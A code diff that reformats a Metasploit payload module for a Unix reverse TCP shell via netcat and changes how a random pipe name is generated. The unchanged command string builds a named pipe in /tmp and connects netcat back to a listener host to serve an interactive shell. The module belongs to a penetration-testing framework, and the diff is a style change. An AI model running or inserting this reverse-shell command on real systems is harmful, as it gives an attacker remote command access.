@@ -3,37 +3,36 @@
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
 module MetasploitModule
-
   CachedSize = :dynamic
 
   include Msf::Payload::Single
   include Msf::Sessions::CommandShellOptions
 
   def initialize(info = {})
-    super(merge_info(info,
-     'Name'          => 'Unix Command Shell, Reverse TCP (via netcat)',
-     'Description'   => 'Creates an interactive shell via netcat',
-     'Author'         =>
-       [
-         'm-1-k-3',
-         'egypt',
-         'juan vazquez'
-       ],
-     'License'       => MSF_LICENSE,
-     'Platform'      => 'unix',
-     'Arch'          => ARCH_CMD,
-     'Handler'       => Msf::Handler::ReverseTcp,
-     'Session'       => Msf::Sessions::CommandShell,
-     'PayloadType'   => 'cmd',
-     'RequiredCmd'   => 'netcat',
-     'Payload'       =>
-       {
-         'Offsets' => { },
-         'Payload' => ''
-       }
-    ))
+    super(
+      merge_info(
+        info,
+        'Name' => 'Unix Command Shell, Reverse TCP (via netcat)',
+        'Description' => 'Creates an interactive shell via netcat',
+        'Author' => [
+          'm-1-k-3',
+          'egypt',
+          'juan vazquez'
+        ],
+        'License' => MSF_LICENSE,
+        'Platform' => 'unix',
+        'Arch' => ARCH_CMD,
+        'Handler' => Msf::Handler::ReverseTcp,
+        'Session' => Msf::Sessions::CommandShell,
+        'PayloadType' => 'cmd',
+        'RequiredCmd' => 'netcat',
+        'Payload' => {
+          'Offsets' => {},
+          'Payload' => ''
+        }
+      )
+    )
     register_advanced_options(
       [
         OptString.new('NetcatPath', [true, 'The path to the Netcat executable', 'nc']),
@@ -54,7 +53,7 @@ module MetasploitModule
   # Returns the command string to use for execution
   #
   def command_string
-    backpipe = Rex::Text.rand_text_alpha_lower(4+rand(4))
+    backpipe = Rex::Text.rand_text_alpha_lower(4..7)
     "mkfifo /tmp/#{backpipe}; #{datastore['NetcatPath']} #{datastore['LHOST']} #{datastore['LPORT']} 0</tmp/#{backpipe} | #{datastore['ShellPath']} >/tmp/#{backpipe} 2>&1; rm /tmp/#{backpipe}"
   end
 end
